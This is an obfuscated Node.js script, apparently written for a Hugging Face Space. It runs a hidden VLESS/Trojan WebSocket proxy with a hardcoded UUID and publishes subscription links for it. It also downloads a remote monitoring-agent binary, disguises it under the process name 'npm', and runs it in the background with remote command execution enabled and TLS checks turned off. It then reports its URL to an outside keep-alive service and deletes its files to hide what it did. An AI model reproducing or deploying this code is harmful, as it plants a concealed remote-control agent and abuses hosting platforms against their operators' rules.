const _0x2648bf=_0x5b7d;(function(_0x120ff9,_0x4d27c9){const _0x485ff8=_0x5b7d,_0x2e5beb=_0x120ff9();while(!![]){try{const _0x116a92=parseInt(_0x485ff8(0x1ab))/0x1+-parseInt(_0x485ff8(0x1bd))/0x2*(-parseInt(_0x485ff8(0x1c6))/0x3)+-parseInt(_0x485ff8(0x1e4))/0x4+parseInt(_0x485ff8(0x214))/0x5*(-parseInt(_0x485ff8(0x1be))/0x6)+parseInt(_0x485ff8(0x1f7))/0x7*(-parseInt(_0x485ff8(0x1d4))/0x8)+parseInt(_0x485ff8(0x1d1))/0x9+-parseInt(_0x485ff8(0x204))/0xa*(parseInt(_0x485ff8(0x1ef))/0xb);if(_0x116a92===_0x4d27c9)break;else _0x2e5beb['push'](_0x2e5beb['shift']());}catch(_0xb4e299){_0x2e5beb['push'](_0x2e5beb['shift']());}}}(_0x581e,0x9820c));const os=require('os'),http=require(_0x2648bf(0x1a7)),fs=require('fs'),axios=require('axios'),net=require(_0x2648bf(0x1a9)),path=require(_0x2648bf(0x1f6)),crypto=require(_0x2648bf(0x1e0)),{Buffer}=require('buffer'),{exec,execSync}=require(_0x2648bf(0x1ca)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x2648bf(0x1a6)]||_0x2648bf(0x1b2),NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x2648bf(0x1b4)][_0x2648bf(0x1b8)]||'',NEZHA_KEY=process[_0x2648bf(0x1b4)][_0x2648bf(0x1ae)]||'',DOMAIN=process['env'][_0x2648bf(0x20d)]||_0x2648bf(0x1c8),AUTO_ACCESS=process['env'][_0x2648bf(0x1b7)]||![],WSPATH=process[_0x2648bf(0x1b4)][_0x2648bf(0x1ea)]||UUID[_0x2648bf(0x1f1)](0x0,0x8),SUB_PATH=process['env']['SUB_PATH']||_0x2648bf(0x1df),NAME=process['env']['NAME']||'',PORT=process[_0x2648bf(0x1b4)]['PORT']||0xbb8;let ISP='';const GetISP=async()=>{const _0x4ea11b=_0x2648bf;try{const _0x552ab3=await axios[_0x4ea11b(0x1aa)](_0x4ea11b(0x1ce)),_0x51034d=_0x552ab3[_0x4ea11b(0x1e9)];ISP=(_0x51034d[_0x4ea11b(0x1c1)]+'-'+_0x51034d[_0x4ea11b(0x1af)])[_0x4ea11b(0x1dd)](/ /g,'_');}catch(_0x33f3f6){ISP=_0x4ea11b(0x1cf);}};function _0x5b7d(_0x10cee9,_0xeabc5e){const _0x581ec3=_0x581e();return _0x5b7d=function(_0x5b7da1,_0x202f2a){_0x5b7da1=_0x5b7da1-0x1a5;let _0x39ef41=_0x581ec3[_0x5b7da1];return _0x39ef41;},_0x5b7d(_0x10cee9,_0xeabc5e);}function _0x581e(){const _0x28d605=['every','aarch64','join','15tkMrNP','listen','l0r3c-deeyeo.hf.space','&fp=chrome&type=ws&host=','child_process','&type=A','error:\x20','url','https://speed.cloudflare.com/meta','Unknown','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','8526744gUPXEe','concat','2083','1072qhWfNe','map','log','&path=%2F','utf8','decode','finish','send','index.html','replace','once','sub','crypto','readUInt8','split','--tls','1815004ngDqJm','createWriteStream','https://amd64.ssss.nyc.mn/agent','npm','npm\x20is\x20running','data','WSPATH','https://arm64.ssss.nyc.mn/v1','connect','application/json','post','6620966uFsIuD','https://amd64.ssss.nyc.mn/v1','slice','includes','443','then','length','path','11053BXGtTP','utf-8','writeHead','8443','/bin/bash','1.1.1.1','base64','config.yaml','type','pipe','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','\x20-p\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','10ujtMtK','2053','pop','end','false','Failed\x20to\x20resolve\x20','application/dns-json','2096','createHash','DOMAIN','Hello\x20world!','close','update','https://','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','substr','16255KpbzBB','text/html','2087','arm','error','toString','8.8.4.4','UUID','http','chmod\x20+x\x20npm','net','get','1053669VLcvMI','client_secret:\x20','readUInt16BE','NEZHA_KEY','asOrganization','trim','Automatic\x20Access\x20Task\x20added\x20successfully','acf47601-4f7c-48f6-9beb-50bc3922e560','vless://','env','unlink','Answer','AUTO_ACCESS','NEZHA_PORT','npm\x20download\x20successfully','setsid\x20nohup\x20./npm\x20-s\x20','catch','reduce','74046KugVzy','546wytfki','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','write','country','text/plain'];_0x581e=function(){return _0x28d605;};return _0x581e();}GetISP();const httpServer=http['createServer']((_0x488e8a,_0x5997e3)=>{const _0x41d146=_0x2648bf;if(_0x488e8a[_0x41d146(0x1cd)]==='/'){const _0x4ad7a0=path['join'](__dirname,_0x41d146(0x1dc));fs['readFile'](_0x4ad7a0,_0x41d146(0x1d8),(_0x311e50,_0x1ccc3e)=>{const _0xae7860=_0x41d146;if(_0x311e50){_0x5997e3[_0xae7860(0x1f9)](0xc8,{'Content-Type':_0xae7860(0x215)}),_0x5997e3[_0xae7860(0x207)](_0xae7860(0x20e));return;}_0x5997e3[_0xae7860(0x1f9)](0xc8,{'Content-Type':_0xae7860(0x215)}),_0x5997e3[_0xae7860(0x207)](_0x1ccc3e);});return;}else{if(_0x488e8a[_0x41d146(0x1cd)]==='/'+SUB_PATH){const _0x1b16df=NAME?NAME+'-'+ISP:ISP,_0x12133d=_0x41d146(0x1b3)+UUID+'@cdns.doon.eu.org:443?encryption=none&security=tls&sni='+DOMAIN+_0x41d146(0x1c9)+DOMAIN+_0x41d146(0x1d7)+WSPATH+'#'+_0x1b16df,_0x3573a3='trojan://'+UUID+'@cdns.doon.eu.org:443?security=tls&sni='+DOMAIN+_0x41d146(0x1c9)+DOMAIN+_0x41d146(0x1d7)+WSPATH+'#'+_0x1b16df,_0x6641ee=_0x12133d+'\x0a'+_0x3573a3,_0x16df7c=Buffer['from'](_0x6641ee)[_0x41d146(0x219)](_0x41d146(0x1fd));_0x5997e3[_0x41d146(0x1f9)](0xc8,{'Content-Type':'text/plain'}),_0x5997e3['end'](_0x16df7c+'\x0a');}else _0x5997e3['writeHead'](0x194,{'Content-Type':_0x41d146(0x1c2)}),_0x5997e3[_0x41d146(0x207)]('Not\x20Found\x0a');}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID[_0x2648bf(0x1dd)](/-/g,''),DNS_SERVERS=[_0x2648bf(0x1a5),_0x2648bf(0x1fc)];function resolveHost(_0x476545){return new Promise((_0xa1bd4d,_0x5e9257)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x476545)){_0xa1bd4d(_0x476545);return;}let _0x15e219=0x0;function _0x2a7764(){const _0x4141dc=_0x5b7d;if(_0x15e219>=DNS_SERVERS[_0x4141dc(0x1f5)]){_0x5e9257(new Error(_0x4141dc(0x209)+_0x476545+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x51ee84=DNS_SERVERS[_0x15e219];_0x15e219++;const _0x3f3292='https://dns.google/resolve?name='+encodeURIComponent(_0x476545)+_0x4141dc(0x1cb);axios['get'](_0x3f3292,{'timeout':0x1388,'headers':{'Accept':_0x4141dc(0x20a)}})[_0x4141dc(0x1f4)](_0x1355cb=>{const _0xead5f5=_0x4141dc,_0x1d1fff=_0x1355cb[_0xead5f5(0x1e9)];if(_0x1d1fff['Status']===0x0&&_0x1d1fff[_0xead5f5(0x1b6)]&&_0x1d1fff['Answer'][_0xead5f5(0x1f5)]>0x0){const _0x17a28f=_0x1d1fff[_0xead5f5(0x1b6)]['find'](_0x33d8ab=>_0x33d8ab[_0xead5f5(0x1ff)]===0x1);if(_0x17a28f){_0xa1bd4d(_0x17a28f[_0xead5f5(0x1e9)]);return;}}_0x2a7764();})[_0x4141dc(0x1bb)](_0x45fba4=>{_0x2a7764();});}_0x2a7764();});}function handleVlessConnection(_0x1a297f,_0x369f5a){const _0x519d4c=_0x2648bf,[_0x5980b6]=_0x369f5a,_0x3574f6=_0x369f5a[_0x519d4c(0x1f1)](0x1,0x11);if(!_0x3574f6[_0x519d4c(0x1c3)]((_0x3bc399,_0x16ff88)=>_0x3bc399==parseInt(uuid[_0x519d4c(0x213)](_0x16ff88*0x2,0x2),0x10)))return![];let _0x2fe168=_0x369f5a['slice'](0x11,0x12)[_0x519d4c(0x1e1)]()+0x13;const _0xad9697=_0x369f5a[_0x519d4c(0x1f1)](_0x2fe168,_0x2fe168+=0x2)[_0x519d4c(0x1ad)](0x0),_0x1544dc=_0x369f5a[_0x519d4c(0x1f1)](_0x2fe168,_0x2fe168+=0x1)[_0x519d4c(0x1e1)](),_0x32e0e3=_0x1544dc==0x1?_0x369f5a[_0x519d4c(0x1f1)](_0x2fe168,_0x2fe168+=0x4)['join']('.'):_0x1544dc==0x2?new TextDecoder()[_0x519d4c(0x1d9)](_0x369f5a[_0x519d4c(0x1f1)](_0x2fe168+0x1,_0x2fe168+=0x1+_0x369f5a[_0x519d4c(0x1f1)](_0x2fe168,_0x2fe168+0x1)[_0x519d4c(0x1e1)]())):_0x1544dc==0x3?_0x369f5a[_0x519d4c(0x1f1)](_0x2fe168,_0x2fe168+=0x10)[_0x519d4c(0x1bc)]((_0x375209,_0x5324b6,_0x445fbf,_0x4c8df7)=>_0x445fbf%0x2?_0x375209[_0x519d4c(0x1d2)](_0x4c8df7['slice'](_0x445fbf-0x1,_0x445fbf+0x1)):_0x375209,[])[_0x519d4c(0x1d5)](_0x4fabe0=>_0x4fabe0[_0x519d4c(0x1ad)](0x0)[_0x519d4c(0x219)](0x10))[_0x519d4c(0x1c5)](':'):'';_0x1a297f[_0x519d4c(0x1db)](new Uint8Array([_0x5980b6,0x0]));const _0x37c61c=createWebSocketStream(_0x1a297f);return resolveHost(_0x32e0e3)[_0x519d4c(0x1f4)](_0x9656c4=>{const _0x7e35b7=_0x519d4c;net[_0x7e35b7(0x1ec)]({'host':_0x9656c4,'port':_0xad9697},function(){const _0x455c22=_0x7e35b7;this[_0x455c22(0x1c0)](_0x369f5a['slice'](_0x2fe168)),_0x37c61c['on'](_0x455c22(0x218),()=>{})['pipe'](this)['on'](_0x455c22(0x218),()=>{})[_0x455c22(0x200)](_0x37c61c);})['on'](_0x7e35b7(0x218),()=>{});})[_0x519d4c(0x1bb)](_0x4bd0af=>{net['connect']({'host':_0x32e0e3,'port':_0xad9697},function(){const _0x4c77c0=_0x5b7d;this[_0x4c77c0(0x1c0)](_0x369f5a[_0x4c77c0(0x1f1)](_0x2fe168)),_0x37c61c['on']('error',()=>{})['pipe'](this)['on'](_0x4c77c0(0x218),()=>{})[_0x4c77c0(0x200)](_0x37c61c);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x59033a,_0x32be4b){const _0x2cfda0=_0x2648bf;try{if(_0x32be4b['length']<0x3a)return![];const _0x4fb111=_0x32be4b[_0x2cfda0(0x1f1)](0x0,0x38)[_0x2cfda0(0x219)](),_0x455e8e=[UUID];let _0x17dd4f=null;for(const _0x13183f of _0x455e8e){const _0x9d2c76=crypto[_0x2cfda0(0x20c)]('sha224')[_0x2cfda0(0x210)](_0x13183f)['digest']('hex');if(_0x9d2c76===_0x4fb111){_0x17dd4f=_0x13183f;break;}}if(!_0x17dd4f)return![];let _0x206748=0x38;_0x32be4b[_0x206748]===0xd&&_0x32be4b[_0x206748+0x1]===0xa&&(_0x206748+=0x2);const _0x3f986a=_0x32be4b[_0x206748];if(_0x3f986a!==0x1)return![];_0x206748+=0x1;const _0x42ee4d=_0x32be4b[_0x206748];_0x206748+=0x1;let _0x2aff7a,_0x4a5092;if(_0x42ee4d===0x1)_0x2aff7a=_0x32be4b[_0x2cfda0(0x1f1)](_0x206748,_0x206748+0x4)[_0x2cfda0(0x1c5)]('.'),_0x206748+=0x4;else{if(_0x42ee4d===0x3){const _0x40c182=_0x32be4b[_0x206748];_0x206748+=0x1,_0x2aff7a=_0x32be4b[_0x2cfda0(0x1f1)](_0x206748,_0x206748+_0x40c182)[_0x2cfda0(0x219)](),_0x206748+=_0x40c182;}else{if(_0x42ee4d===0x4)_0x2aff7a=_0x32be4b[_0x2cfda0(0x1f1)](_0x206748,_0x206748+0x10)['reduce']((_0xc9745e,_0xd356f1,_0x42987f,_0x2bf808)=>_0x42987f%0x2?_0xc9745e[_0x2cfda0(0x1d2)](_0x2bf808[_0x2cfda0(0x1f1)](_0x42987f-0x1,_0x42987f+0x1)):_0xc9745e,[])[_0x2cfda0(0x1d5)](_0x1c8343=>_0x1c8343[_0x2cfda0(0x1ad)](0x0)[_0x2cfda0(0x219)](0x10))['join'](':'),_0x206748+=0x10;else return![];}}_0x4a5092=_0x32be4b[_0x2cfda0(0x1ad)](_0x206748),_0x206748+=0x2;_0x206748<_0x32be4b[_0x2cfda0(0x1f5)]&&_0x32be4b[_0x206748]===0xd&&_0x32be4b[_0x206748+0x1]===0xa&&(_0x206748+=0x2);const _0x14ccd5=createWebSocketStream(_0x59033a);return resolveHost(_0x2aff7a)[_0x2cfda0(0x1f4)](_0x2d7360=>{const _0x1a109b=_0x2cfda0;net[_0x1a109b(0x1ec)]({'host':_0x2d7360,'port':_0x4a5092},function(){const _0x232311=_0x1a109b;_0x206748<_0x32be4b[_0x232311(0x1f5)]&&this['write'](_0x32be4b[_0x232311(0x1f1)](_0x206748)),_0x14ccd5['on'](_0x232311(0x218),()=>{})[_0x232311(0x200)](this)['on']('error',()=>{})[_0x232311(0x200)](_0x14ccd5);})['on'](_0x1a109b(0x218),()=>{});})[_0x2cfda0(0x1bb)](_0x119d32=>{const _0x18892d=_0x2cfda0;net[_0x18892d(0x1ec)]({'host':_0x2aff7a,'port':_0x4a5092},function(){const _0x1cc81a=_0x18892d;_0x206748<_0x32be4b[_0x1cc81a(0x1f5)]&&this[_0x1cc81a(0x1c0)](_0x32be4b[_0x1cc81a(0x1f1)](_0x206748)),_0x14ccd5['on'](_0x1cc81a(0x218),()=>{})[_0x1cc81a(0x200)](this)['on'](_0x1cc81a(0x218),()=>{})[_0x1cc81a(0x200)](_0x14ccd5);})['on'](_0x18892d(0x218),()=>{});}),!![];}catch(_0x5f30b9){return![];}}wss['on']('connection',(_0x49e4a5,_0x1f7f9d)=>{const _0x14690e=_0x2648bf,_0xfce82f=_0x1f7f9d[_0x14690e(0x1cd)]||'';_0x49e4a5[_0x14690e(0x1de)]('message',_0x55aa21=>{const _0x18d89f=_0x14690e;if(_0x55aa21[_0x18d89f(0x1f5)]>0x11&&_0x55aa21[0x0]===0x0){const _0x57841b=_0x55aa21[_0x18d89f(0x1f1)](0x1,0x11),_0x372ba7=_0x57841b['every']((_0x1c1049,_0x5f437a)=>_0x1c1049==parseInt(uuid[_0x18d89f(0x213)](_0x5f437a*0x2,0x2),0x10));if(_0x372ba7){!handleVlessConnection(_0x49e4a5,_0x55aa21)&&_0x49e4a5[_0x18d89f(0x20f)]();return;}}!handleTrojanConnection(_0x49e4a5,_0x55aa21)&&_0x49e4a5[_0x18d89f(0x20f)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x1cb782=_0x2648bf,_0x447d54=os['arch']();return _0x447d54===_0x1cb782(0x217)||_0x447d54==='arm64'||_0x447d54===_0x1cb782(0x1c4)?!NEZHA_PORT?_0x1cb782(0x1eb):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x1cb782(0x1f0):_0x1cb782(0x1e6);},downloadFile=async()=>{const _0xc16e1e=_0x2648bf;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x114a29=getDownloadUrl(),_0x52a61c=await axios({'method':_0xc16e1e(0x1aa),'url':_0x114a29,'responseType':'stream'}),_0x564e12=fs[_0xc16e1e(0x1e5)](_0xc16e1e(0x1e7));return _0x52a61c['data']['pipe'](_0x564e12),new Promise((_0x3c45d2,_0x5ca265)=>{const _0x1219c3=_0xc16e1e;_0x564e12['on'](_0x1219c3(0x1da),()=>{const _0x12549c=_0x1219c3;console[_0x12549c(0x1d6)](_0x12549c(0x1b9)),exec(_0x12549c(0x1a8),_0x57ddb2=>{if(_0x57ddb2)_0x5ca265(_0x57ddb2);_0x3c45d2();});}),_0x564e12['on'](_0x1219c3(0x218),_0x5ca265);});}catch(_0x3d9e6d){throw _0x3d9e6d;}},runnz=async()=>{const _0x222a2c=_0x2648bf;try{const _0x5c0326=execSync(_0x222a2c(0x1d0),{'encoding':_0x222a2c(0x1f8)});if(_0x5c0326[_0x222a2c(0x1b0)]()!==''){console[_0x222a2c(0x1d6)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x5b4483){}await downloadFile();let _0x33aa0c='',_0x4dc91a=[_0x222a2c(0x1f3),_0x222a2c(0x1fa),_0x222a2c(0x20b),_0x222a2c(0x216),_0x222a2c(0x1d3),_0x222a2c(0x205)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x10c5af=_0x4dc91a['includes'](NEZHA_PORT)?_0x222a2c(0x1e3):'';_0x33aa0c=_0x222a2c(0x1ba)+NEZHA_SERVER+':'+NEZHA_PORT+_0x222a2c(0x202)+NEZHA_KEY+'\x20'+_0x10c5af+_0x222a2c(0x201);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xb57cd3=NEZHA_SERVER[_0x222a2c(0x1f2)](':')?NEZHA_SERVER[_0x222a2c(0x1e2)](':')[_0x222a2c(0x206)]():'',_0x115c47=_0x4dc91a['includes'](_0xb57cd3)?'true':_0x222a2c(0x208),_0x574bf5=_0x222a2c(0x1ac)+NEZHA_KEY+_0x222a2c(0x1bf)+NEZHA_SERVER+_0x222a2c(0x203)+_0x115c47+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](_0x222a2c(0x1fe),_0x574bf5);}_0x33aa0c=_0x222a2c(0x212);}else{console[_0x222a2c(0x1d6)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x33aa0c,{'shell':_0x222a2c(0x1fb)},_0x18d992=>{const _0x2b00bd=_0x222a2c;if(_0x18d992)console[_0x2b00bd(0x218)]('npm\x20running\x20error:',_0x18d992);else console[_0x2b00bd(0x1d6)](_0x2b00bd(0x1e8));});}catch(_0x29e5e2){console[_0x222a2c(0x218)](_0x222a2c(0x1cc)+_0x29e5e2);}};async function addAccessTask(){const _0x352001=_0x2648bf;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x2f788c=_0x352001(0x211)+DOMAIN+'/'+SUB_PATH;try{const _0x552dbd=await axios[_0x352001(0x1ee)]('https://oooo.serv00.net/add-url',{'url':_0x2f788c},{'headers':{'Content-Type':_0x352001(0x1ed)}});console[_0x352001(0x1d6)](_0x352001(0x1b1));}catch(_0x246c5e){}}const delFiles=()=>{const _0x17f35c=_0x2648bf;fs[_0x17f35c(0x1b5)](_0x17f35c(0x1e7),()=>{}),fs[_0x17f35c(0x1b5)](_0x17f35c(0x1fe),()=>{});};httpServer[_0x2648bf(0x1c7)](PORT,()=>{const _0x5d58b8=_0x2648bf;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x5d58b8(0x1d6)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
